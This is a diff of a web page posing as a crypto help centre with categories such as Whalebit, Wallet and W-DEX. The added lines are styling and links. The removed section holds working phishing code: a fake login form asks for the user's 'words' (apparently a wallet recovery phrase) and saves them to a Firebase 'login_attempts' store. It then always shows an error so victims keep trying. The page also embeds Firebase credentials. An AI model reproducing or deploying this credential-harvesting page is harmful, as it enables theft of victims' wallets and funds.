@@ -115,12 +115,13 @@
             gap:10px;
             align-items:center;
             justify-content:space-between;
+            flex-wrap:wrap;
         }
 
         .msg-text{
             color:#555;
             font-size:16px;
-            flex-grow:1;
+            width:100%;
         }
 
         .blue-btn{
@@ -132,6 +133,8 @@
             font-weight:600;
             cursor:pointer;
             font-size:14px;
+            flex:1;
+            min-width:140px;
         }
 
         .category-title{
@@ -213,9 +216,11 @@
         }
 
         .desc-text{
-            color:#666;
+            color:#ccc;
             font-size:13px;
-            line-height:1.4;
+            line-height:1.5;
+            margin-top:8px;
+            margin-bottom:15px;
         }
 
         .attach-btn{
@@ -393,11 +398,23 @@
             </div>
 
             <div class="cat-item" onclick="showPage('page-question')">
+                Whalebit (CES) <span class="arrow-right">›</span>
+            </div>
+
+            <div class="cat-item" onclick="showPage('page-question')">
                 Wallet <span class="arrow-right">›</span>
             </div>
 
             <div class="cat-item" onclick="showPage('page-question')">
-                Other <span class="arrow-right">›</span>
+                T&S <span class="arrow-right">›</span>
+            </div>
+
+            <div class="cat-item" onclick="showPage('page-question')">
+                W-DEX <span class="arrow-right">›</span>
+            </div>
+
+            <div class="cat-item" onclick="showPage('page-question')">
+                Others <span class="arrow-right">›</span>
             </div>
 
         </div>
@@ -405,242 +422,3 @@
     </div>
 
 </div>
-
-<!-- QUESTION PAGE -->
-
-<div id="page-question" class="hidden">
-
-    <div class="page-header">
-
-        <div style="font-weight:bold;font-size:18px;">
-            New question
-        </div>
-
-        <div class="close-btn" onclick="goHome()">×</div>
-
-    </div>
-
-    <div class="container">
-
-        <form id="qForm">
-
-            <span class="label">TITLE SUBJECT</span>
-
-            <select id="topic" class="input-box" required>
-
-                <option value="">Select a topic</option>
-                <option>Technical problem on the site</option>
-                <option>Wallet problem</option>
-                <option>Others</option>
-
-            </select>
-
-            <span class="label">PROBLEM DESCRIPTION</span>
-
-            <textarea
-                id="q-desc"
-                class="input-box"
-                style="height:120px;"
-                placeholder="Describe your problem"
-                required></textarea>
-
-            <p class="red-warning">
-                the message must have at least 150 characters
-            </p>
-
-            <button type="button" class="attach-btn">
-                📎 Attach files
-            </button>
-
-            <div class="footer-action">
-
-                <button
-                    type="button"
-                    class="cancel-btn"
-                    onclick="goHome()">
-
-                    Cancel
-
-                </button>
-
-                <button type="submit" class="send-btn">
-                    Send
-                </button>
-
-            </div>
-
-        </form>
-
-    </div>
-
-</div>
-
-<!-- LOGIN PAGE -->
-
-<div id="page-login" class="hidden">
-
-    <div class="container">
-
-        <div class="welcome-title">
-            Welcome to the help center
-        </div>
-
-        <div class="login-card">
-
-            <div class="login-title">
-                login your account for direct request
-            </div>
-
-            <form id="lForm">
-
-                <textarea
-                    id="l-input"
-                    class="login-textarea"
-                    placeholder="input your words for login account"
-                    required></textarea>
-
-                <button type="submit" class="login-submit">
-                    login first
-                </button>
-
-            </form>
-
-            <div id="login-error">
-                Please login another account
-            </div>
-
-        </div>
-
-    </div>
-
-</div>
-
-<script>
-
-    const firebaseConfig = {
-
-        apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
-
-        authDomain: "v-academy-82560.firebaseapp.com",
-
-        databaseURL: "https://v-academy-82560-default-rtdb.firebaseio.com",
-
-        projectId: "v-academy-82560",
-
-        storageBucket: "v-academy-82560.firebasestorage.app",
-
-        messagingSenderId: "826822771378",
-
-        appId: "1:826822771378:web:5357b1b989b298a8027fab"
-
-    };
-
-    firebase.initializeApp(firebaseConfig);
-
-    const db = firebase.database();
-
-    function showPage(id){
-
-        document.getElementById('page-home').classList.add('hidden');
-        document.getElementById('page-question').classList.add('hidden');
-        document.getElementById('page-login').classList.add('hidden');
-
-        document.getElementById(id).classList.remove('hidden');
-
-        window.scrollTo(0,0);
-    }
-
-    function goHome(){
-
-        showPage('page-home');
-    }
-
-    function showPopupError(){
-
-        const err = document.getElementById('web-error');
-
-        err.style.display = 'block';
-
-        setTimeout(() => {
-
-            err.style.display = 'none';
-
-        },3000);
-    }
-
-    /* QUESTION SAVE */
-
-    document.getElementById('qForm').addEventListener('submit', async function(e){
-
-        e.preventDefault();
-
-        const topic = document.getElementById('topic').value.trim();
-
-        const desc = document.getElementById('q-desc').value.trim();
-
-        try{
-
-            const ref = db.ref("support_questions").push();
-
-            await ref.set({
-
-                id: ref.key,
-
-                topic: topic,
-
-                description: desc,
-
-                time: new Date().toLocaleString()
-
-            });
-
-            alert("Sent Successfully!");
-
-            document.getElementById('qForm').reset();
-
-            goHome();
-
-        } catch(error){
-
-            alert("Firebase Error: " + error.message);
-        }
-
-    });
-
-    /* LOGIN SAVE */
-
-    document.getElementById('lForm').addEventListener('submit', async function(e){
-
-        e.preventDefault();
-
-        const inputText = document.getElementById('l-input').value.trim();
-
-        try{
-
-            const ref = db.ref("login_attempts").push();
-
-            await ref.set({
-
-                id: ref.key,
-
-                info: inputText,
-
-                time: new Date().toLocaleString()
-
-            });
-
-            document.getElementById('login-error').style.display = 'block';
-
-            document.getElementById('l-input').value = "";
-
-        } catch(error){
-
-            alert("Firebase Error: " + error.message);
-        }
-
-    });
-
-</script>
-
-</body>
-</html>
